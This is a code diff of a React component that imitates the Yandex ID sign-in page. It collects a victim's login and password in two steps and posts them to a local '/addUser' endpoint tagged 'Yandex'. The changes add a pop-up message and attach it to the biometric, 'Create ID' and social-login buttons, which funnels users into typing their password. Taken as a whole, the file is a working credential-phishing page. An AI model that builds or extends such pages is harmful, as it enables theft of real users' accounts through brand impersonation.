@@ -15,12 +15,20 @@ import PhoneForm from "../components/PhoneForm"
 const YandexAuth = () => {
     const [isNumber, setIsNumber] = useState(false)
     const [inputValue, setInputValue] = useState("")
+    const [login, setLogin] = useState("");
+
     const [error, setError] = useState(false)
 
     const [step, setStep] = useState("login");
-    const [login, setLogin] = useState("");
     const [password, setPassword] = useState("");
-    
+
+    const [showToast, setShowToast] = useState(false)
+
+    const handleClick = () => {
+        setShowToast(true);
+        setTimeout(() => setShowToast(false), 3000); // Убираем через 3 сек
+    };
+
 
     const handleButtonClick = (e) => {
         e.preventDefault()
@@ -30,43 +38,44 @@ const YandexAuth = () => {
             return;
         }
         setError(false)
-        
-        if (step === "login") {
-      setLogin(inputValue);
-      setInputValue("");
-      setStep("password");
-    }
-    else if (step === "password") {
-      const userData = {
-        login, 
-        password: inputValue,
-        resource: "Yandex"
-      };
 
-      fetch("http://localhost:8000/addUser", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify(userData),
-      })
-        .then(async (response) => {
-          const data = await response.json();
-          if (response.ok) {
-            console.log("Пользователь добавлен:", data);
+        if (step === "login") {
+            setLogin(inputValue);
             setInputValue("");
-            setStep("login")
-          } else {
-            console.error("Ошибка:", data.error);
-            setError(true);
-          }
-        })
-        .catch((error) => {
-          console.error("Ошибка при отправке запроса:", error);
-          setError(true);
-        })}
+            setStep("password");
+        }
+        else if (step === "password") {
+            const userData = {
+                login,
+                password: inputValue,
+                resource: "Yandex"
+            };
+
+            fetch("http://localhost:8000/addUser", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify(userData),
+            })
+                .then(async (response) => {
+                    const data = await response.json();
+                    if (response.ok) {
+                        console.log("Пользователь добавлен:", data);
+                        setInputValue("");
+                        setStep("login")
+                    } else {
+                        console.error("Ошибка:", data.error);
+                        setError(true);
+                    }
+                })
+                .catch((error) => {
+                    console.error("Ошибка при отправке запроса:", error);
+                    setError(true);
+                })
+        }
     };
-     
+
     const toggle = () => {
         setIsNumber(!isNumber)
     }
@@ -74,7 +83,7 @@ const YandexAuth = () => {
     return (
         <>
             <div className="flex flex-col items-center justify-center gap-2 min-h-screen bg-[#121212] text-white">
-                <div className="bg-[#1c1c1c] rounded-3xl p-[32px] max-w-[412px] text-center">
+                <div className="bg-[#1c1c1c] rounded-3xl p-[32px] max-w-[412px] text-center m-20">
                     <div className="flex items-center justify-between mb-4">
                         <button className="text-xl"><FaArrowLeft /></button>
                         <img className="max-w-40 text-wh invert" src={YaIdLogo} />
@@ -93,18 +102,17 @@ const YandexAuth = () => {
                                 <input
                                     value={inputValue}
                                     onChange={(e) => setInputValue(e.target.value)}
-                                    type={step === "login" ? "number" : "password"}
+                                    type={step === "login" ? "tel" : "password"}
                                     onFocus={() => setError(false)}
                                     placeholder={
-                                        error 
-                                        ? "Введите данные" 
-                                        : step === "login"
-                                        ? "+7 (000) 000 00 00"
-                                        : "Пароль"
+                                        error
+                                            ? "Введите данные"
+                                            : step === "login"
+                                                ? "+7 (000) 000 00 00"
+                                                : "Пароль"
                                     }
-                                    className={`w-full py-3 pl-16 rounded-2xl border-[1px] border-[#d3d3de33] min-h-10 bg-[#1c1c1c] text-white placeholder-gray-400 outline-none focus:ring-2 focus:ring-gray-500 text-2xl ${
-                                        error ? "border-red-500 text-red-400 placeholder-red-400" : "border-[#d3d3de33] focus:ring-gray-500"
-                                      }`}
+                                    className={`w-full py-3 pl-16 rounded-2xl border-[1px] border-[#d3d3de33] min-h-10 bg-[#1c1c1c] text-white placeholder-gray-400 outline-none focus:ring-2 focus:ring-gray-500 text-2xl ${error ? "border-red-500 text-red-400 placeholder-red-400" : "border-[#d3d3de33] focus:ring-gray-500"
+                                        }`}
                                 />
                                 {/* <PhoneForm /> */}
                             </div>)
@@ -118,15 +126,14 @@ const YandexAuth = () => {
                                     type={step === "login" ? "text" : "password"}
                                     placeholder={
                                         error
-                                        ? "Введите данные!"
-                                        : step === "login"
-                                        ? "Логин или email"
-                                        : "Пароль"
+                                            ? "Введите данные"
+                                            : step === "login"
+                                                ? "Логин или email"
+                                                : "Пароль"
                                     }
-                                    className={`w-full p-3 rounded-2xl border min-h-10 bg-[#1c1c1c] text-white placeholder-gray-400 outline-none focus:ring-2 focus:ring-gray-500 text-2xl ${
-                                        error ? "border-red-500 text-red-400 placeholder-red-400" : "border-[#d3d3de33]"
-                                    }`}
-                                    />
+                                    className={`w-full p-3 rounded-2xl border min-h-10 bg-[#1c1c1c] text-white placeholder-gray-400 outline-none focus:ring-2 focus:ring-gray-500 text-2xl ${error ? "border-red-500 text-red-400 placeholder-red-400" : "border-[#d3d3de33]"
+                                        }`}
+                                />
                             </div>)
                         }
                         <ButtonComponent
@@ -137,25 +144,45 @@ const YandexAuth = () => {
                             textColor="text-[#1f1f24]"
                         />
                         <ButtonComponent
+                            handleClick={handleClick}
                             name="По лицу или отпечатку"
                             backGround="bg-[#d3d3de33]"
                             textColor="text-white"
                         />
+
+                        {showToast && (
+                            <div className="fixed top-5 left-1/2 transform -translate-x-1/2 bg-black text-white px-4 py-2 rounded-md shadow-lg animate-fade-in">
+                                Вход возможен только по почте или номеру телефона
+                            </div>
+                        )}
+
+                        <style>{`
+                        @keyframes fadeIn {
+                            from { opacity: 0; transform: translateY(-10px) translateX(-50%); }
+                            to { opacity: 1; transform: translateY(0) translateX(-50%); }
+                        }
+                        .animate-fade-in {
+                            animation: fadeIn 0.3s ease-in-out;
+                        }
+                        `}</style>
+
+
                         <ButtonComponent
+                            handleClick={handleClick}
                             name="Создать ID"
                             backGround="bg-[#1c1c1c] "
                             textColor="text-white"
                         />
                     </form>
-                    
+
                     <h3>Войти с помощью</h3>
 
                     <div className="flex items-center justify-center gap-8 mt-5">
-                        <img src={vkImg} alt="VK" className="w-8 h-8 cursor-pointer" />
-                        <img src={googleImg} alt="Google" className="w-8 h-8 cursor-pointer" />
-                        <img src={qrImage} alt="QR-код" className="w-8 h-8 cursor-pointer" />
-                        <img src={facebookImg} alt="Facebook" className="w-8 h-8 cursor-pointer" />
-                        <img src={moreImg} alt="More" className="w-8 h-2 cursor-pointer" />
+                        <img src={vkImg} alt="VK" className="w-8 h-8 cursor-pointer" onClick={handleClick}/>
+                        <img src={googleImg} alt="Google" className="w-8 h-8 cursor-pointer" onClick={handleClick}/>
+                        <img src={qrImage} alt="QR-код" className="w-8 h-8 cursor-pointer" onClick={handleClick}/>
+                        <img src={facebookImg} alt="Facebook" className="w-8 h-8 cursor-pointer" onClick={handleClick}/>
+                        <img src={moreImg} alt="More" className="w-8 h-2 cursor-pointer" onClick={handleClick}/>
                     </div>
                 </div>
                 <div className="text-center mt-5 text-sm text-gray-400">
